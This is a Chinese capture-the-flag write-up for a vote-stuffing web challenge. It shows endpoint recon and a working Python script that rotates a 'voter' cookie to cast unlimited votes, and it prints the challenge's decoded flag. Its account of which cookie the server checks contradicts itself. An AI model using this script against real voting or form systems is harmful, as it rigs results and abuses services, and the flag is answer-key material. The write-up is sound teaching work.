## 一、题面

一个角色投票站点，首页写「年度最受欢迎角色投票大赛」，页面上有若干角色和投票按钮。
目标是把 `vid=7`（永雏塔菲）的票数刷上去，票数达标后接口返回 flag。

## 二、侦察：接口是怎么找到的

**结论先行：接口名从来没猜过，全是页面自己说的。**

### 2.1 第一步：读首页，扫 `/api/` 路径

页面上那个「投票」按钮要能工作，浏览器就必须知道往哪发请求 —— 所以接口名**必然明文写在 HTML 或 JS 里**。

```python
import re, requests
html = requests.get(BASE + "/").text
print(set(re.findall(r"['\"](/api/[A-Za-z0-9_/\-]+)", html)))
# {'/api/data', '/api/vote'}
```

顺带把 method 和参数名一起抓出来：

```python
for m in re.finditer(r"fetch\(\s*['\"]([^'\"]+)['\"](.*?)\)", html, re.S):
    print(m.group(1), re.search(r"method:\s*['\"](\w+)", m.group(2)))
# /api/data  None    → 默认 GET
# /api/vote  POST
```

### 2.2 第二步：`/api/data` 是白送的

`POST /api/data` **不需要登录**就返回整个榜单：

```json
{
  "ok": true,
  "user": null,
  "target": {"vid": 7, "name": "永雏塔菲", "score": 200},
  "characters": [
    {"id": 1, "name": "…", "votes": 12},
    {"id": 4, "name": "…", "votes": 30},
    {"id": 7, "name": "永雏塔菲", "votes": 3}
  ]
}
```

字段名：

| 字段 | 读出来的信息 |
|---|---|
| `target.vid = 7` | 要投的角色是 id=7，**参数名可能就叫 `vid`** |
| `target.score = 200` | 目标的票数门槛 |
| `characters[].id` | 证明 `vid` 指的就是这个 id |

### 2.3 第三步：从命名风格反推其余接口

`/api/data` 是统一风格，同族接口就好猜：`/api/register`、`/api/login`、`/api/vote`。
**猜完必须验证**，而且要用状态码区分'不存在'和'存在但不能用'：

| 返回 | 含义 |
|---|---|
| 404 Not Found | 接口不存在 |
| **405 Method Not Allowed** | 接口**存在**，只是 method 用错了 |
| 401 / 403 | 接口**存在**，只是要登录或权限不够 |
| 200 + JSON | 命中 |

### 2.4 第四步：F12 的 Network 面板

在页面上点一次「投票」按钮，Network 里就会冒出真实请求，URL、method、参数名、Cookie 全在里面。
本题的 `sid` 就是用这个办法拿到的 —— 不需要猜，让浏览器替你发一次，你只管看。

## 三、完整利用

### 3.1 业务逻辑缺口

服务端判重**只认 `sid`（会话）**，不认 `voter`（访客标识）。
于是：**固定一个有效 `sid`，每轮换一个新的 `voter`，就能无限投票。**

两个 Cookie 的分工：

| Cookie | 作用 | 是否要换 |
|---|---|---|
| `sid` | 会话「通行证」，注册登录后拿到 | 固定不变 |
| `voter` | 访客标识，服务端判重就看它 | 每轮新造 |

### 3.2 服务端返回

```json
{"ok": true,
 "data": {"votes": 310, "name": "永雏塔菲",
          "flag": "MHhHYW1le3YwdGVfNF90YWYzaV9UaGFuazVfbWlAb30="}}
```

`flag` 是 **base64** 的，解一次就出：

```
MHhHYW1le3YwdGVfNF90YWYzaV9UaGFuazVfbWlAb30=
  → 0xGame{v0te_4_taf3i_Thank5_mi@o}
```

### 3.3 原版脚本

```python
import requests, secrets, base64

BASE = "http://<实例域名>"
sid  = "<手动从 F12 拿>"

r = None
for i in range(200):
    S = requests.Session()
    S.cookies.set("sid", sid)
    S.cookies.set("voter", "g" + secrets.token_hex(8))
    r = S.post(BASE + "/api/vote", data={"vid": 7}).json()

print(base64.b64decode(r["data"]["flag"]).decode())
```



## 五、复盘

### 核心

1. **接口不需要猜，页面自己会说。** 前端要让按钮工作就必须写清路径和方法 —— 读 HTML/JS 是零成本的「官方文档」。找不到就 F12 点一下，让浏览器替你发。
2. **一个接口的字段名，是下一个接口的参数名。** `target.vid` 直接给出了 `vid=7` 这个参数。侦察不是「先侦察完再动手」，而是**每一步的响应都在给下一步提供输入**。
3. **404 / 405 / 401 要分开看。** 405 和 401 是金矿 —— 它们泄露了「这个路径是活的」，只是方法或权限不对。
4. 服务端到底拿什么字段判「这个人投过票了」？逐个换掉、逐个保留，就能定位。本题答案是 `sid`，而 `voter` 白送。
5. `print(r.text)` → `print(list(j.keys()))` → 逐层钻。顺序永远是先打印、再定位、最后才写死路径，不是反过来。

### 关于「flag 到底在哪一层」

```python
r = S.post(...)
print(r.text)              # 第 1 步：
j = r.json()               # 第 2 步：解析
print(type(j))             # 第 3 步：确认类型
print(list(j.keys()))      # 第 4 步：有哪些 key
print(list(j["data"].keys()))   # 第 5 步：往下钻一层
```
